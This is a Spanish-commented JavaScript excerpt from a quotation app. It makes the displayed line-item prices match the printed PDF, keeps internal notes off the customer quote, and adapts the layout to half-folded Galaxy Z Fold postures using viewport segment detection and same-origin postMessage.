/* ¿Esta partida se imprime con un precio distinto del calculado? Por un ajuste del
   autorizador a esa partida o por su parte de un aumento global. Lo usa la pantalla para
   no decir un número distinto del que va a salir impreso. */
function itemAjustada(it){ return Math.abs(itemPrecioCliente(it)-lineTotal(it))>0.01; }
/* El importe que se enseña de una partida tiene que ser el que va a salir impreso. La
   pantalla pintaba money(lineTotal(it)) mientras el PDF y el texto de Canva usaban
   money(itemPrecio(it)): con un ajuste del autorizador por partida, el vendedor leía en
   voz alta un número y el cliente recibía otro, sin nada que dijera que eran dos. Con el
   aumento repartido pasa lo mismo, así que aquí va el precio del cliente. */
function ltHTML(it){
  const fin=itemPrecioCliente(it);
  if(!itemAjustada(it)) return money(fin);
  return `<span class="lt-calc" title="Calculado ${money(lineTotal(it))}">${money(lineTotal(it))}</span>${money(fin)}`;
}

/* ----- Textos que sí van dirigidos al cliente -----
   Q.nota es el comentario INTERNO del autorizador para el vendedor y antes se
   imprimía tal cual en la cotización del cliente. Ahora el PDF usa notaCliente. */
function notaCliente(){ return (Q.notaCliente||'').trim()||'El cliente debe proporcionar salidas eléctricas.'; }
/* La dirección del PDF es la que capturó el vendedor; Q.direccion queda solo como
   respaldo de lo que haya detectado la IA. */
function direccionPdf(){ return (Q.dirRaw||'').trim()||(Q.direccion||'').trim(); }


/* ===================== El Fold a medio doblar =====================
   Cuando un Galaxy Z Fold se usa medio abierto —como un libro (bisagra vertical) o apoyado en
   la mesa como una laptop (bisagra horizontal, lo que Samsung llama Flex mode)— el navegador
   parte el visor en dos segmentos y lo dice: `window.viewport.segments` (Chrome 135+) y las
   variables `env(viewport-segment-*)` de CSS. Abierto del todo, como una tableta, no hay
   segmentos y nada de esto aplica.

   Aquí se lee esa geometría y se publica en <html> como dos clases y dos variables —
   `html.pliegue-v` / `html.pliegue-h` y `--pliegue-a` / `--pliegue-b`, dónde empieza y dónde
   termina la bisagra en píxeles del visor de ESTE documento— y css/sistema.css decide qué hacer
   con eso (bloque «El Fold medio doblado»). Lo que hoy cambia: en Flex mode el lienzo del
   escalador y del vectorizador se queda en la mitad de arriba y la barra y el panel bajan a la
   mitad de la mesa, como el teclado de una laptop; de libro, las dos columnas del cotizador se
   acomodan una en cada mitad.

   Empotrado en la plataforma, el marco no ve el visor de verdad —sus segmentos son los del
   iframe—, así que la geometría la manda el padre por postMessage, ya restada la posición del
   marco (js/mod/cotizador.js, avisarPliegue). Suelto, se lee aquí. */
function _segmentosDelVisor(){
  try{
    const s=window.viewport&&window.viewport.segments;
    if(s&&s.length===2) return s;
  }catch(_){}
  return null;
}
function _pliegueDeSegmentos(seg){
  if(!seg) return null;
  const [s0,s1]=seg;
  if(s1.left>=s0.left+s0.width-1) return {tipo:'v',a:s0.left+s0.width,b:s1.left};
  if(s1.top>=s0.top+s0.height-1) return {tipo:'h',a:s0.top+s0.height,b:s1.top};
  return null;
}
/* Sin la API, las variables de entorno de CSS: `env()` no se lee desde JS, así que se mide un
   elemento de prueba puesto exactamente sobre la bisagra. */
function _pliegueDeEnv(){
  try{
    const horiz=window.matchMedia('(horizontal-viewport-segments: 2)').matches;
    const vert=!horiz&&window.matchMedia('(vertical-viewport-segments: 2)').matches;
    if(!horiz&&!vert) return null;
    const p=document.createElement('div');
    p.style.cssText=horiz
      ?'position:fixed;top:0;height:1px;left:env(viewport-segment-right 0 0,0px);width:calc(env(viewport-segment-left 1 0,0px) - env(viewport-segment-right 0 0,0px));visibility:hidden;pointer-events:none'
      :'position:fixed;left:0;width:1px;top:env(viewport-segment-bottom 0 0,0px);height:calc(env(viewport-segment-top 0 1,0px) - env(viewport-segment-bottom 0 0,0px));visibility:hidden;pointer-events:none';
    document.body.appendChild(p);
    const r=p.getBoundingClientRect(); p.remove();
    if(horiz) return r.left>0?{tipo:'v',a:r.left,b:r.right}:null;
    return r.top>0?{tipo:'h',a:r.top,b:r.bottom}:null;
  }catch(_){ return null; }
}
let _pliegueActual='';
function aplicarPliegue(p){
  const h=document.documentElement;
  const W=window.innerWidth,H=window.innerHeight;
  /* De libro solo cuando las dos mitades dan para algo: dentro de la plataforma la barra
     lateral se come la izquierda y la mitad del cotizador puede quedar en 230 px; ahí partir
     las columnas en la bisagra es peor que dejar que el contenido la cruce. De mesa, con que
     cada mitad tenga 200 px: el lienzo de arriba y el panel de abajo caben en eso. */
  const v=!!(p&&p.tipo==='v'&&p.a>=380&&(W-p.b)>=240);
  const hz=!!(p&&p.tipo==='h'&&p.a>=200&&(H-p.b)>=200);
  const firma=(v?'v':hz?'h':'')+(v||hz?':'+Math.round(p.a)+':'+Math.round(p.b):'');
  if(firma===_pliegueActual) return;
  _pliegueActual=firma;
  h.classList.toggle('pliegue-v',v);
  h.classList.toggle('pliegue-h',hz);
  if(v||hz){ h.style.setProperty('--pliegue-a',Math.round(p.a)+'px'); h.style.setProperty('--pliegue-b',Math.round(p.b)+'px'); }
  else{ h.style.removeProperty('--pliegue-a'); h.style.removeProperty('--pliegue-b'); }
  /* El escalador y el vectorizador miden su lienzo contra el área que les queda, y el reparto
     acaba de cambiar sin que haya habido ningún resize. Un cuadro después, con el CSS aplicado. */
  setTimeout(()=>{
    try{ if(typeof SC!=='undefined'&&SC.img&&$('scalermodal').classList.contains('show')){ scFitCanvas(true); scRender(); if(typeof scAjustarToast==='function') scAjustarToast(); } }catch(_){}
    try{ if(typeof VT!=='undefined'&&VT.img&&$('vectormodal').classList.contains('show')){ vtFit(); vtRender(); if(typeof vtAjustarToast==='function') vtAjustarToast(); } }catch(_){}
  },0);
}
function ajustarPliegue(){
  if(parent!==window){
    /* Empotrado: la geometría la manda el padre. Se le pide, por si este documento arrancó
       después de que él midiera. */
    try{ parent.postMessage({al3d:'pliegue?'},location.origin); }catch(_){}
    return;
  }
  aplicarPliegue(_pliegueDeSegmentos(_segmentosDelVisor())||_pliegueDeEnv());
}
window.addEventListener('resize',ajustarPliegue);
/* La postura cambia sin que cambie el tamaño del visor —el Fold pasa de plano a medio doblado
   con los mismos 900 px de ancho—, así que `resize` no alcanza: se escuchan las consultas. */
['(horizontal-viewport-segments: 2)','(vertical-viewport-segments: 2)','(device-posture: folded)'].forEach(q=>{
  try{ window.matchMedia(q).addEventListener('change',ajustarPliegue); }catch(_){}
});
window.addEventListener('message',ev=>{
  try{
    if(parent===window||ev.origin!==location.origin||ev.source!==parent) return;
    const d=ev.data;
    if(!d||typeof d!=='object'||d.al3d!=='pliegue') return;
    aplicarPliegue(d.pliegue||null);
  }catch(_){}
});
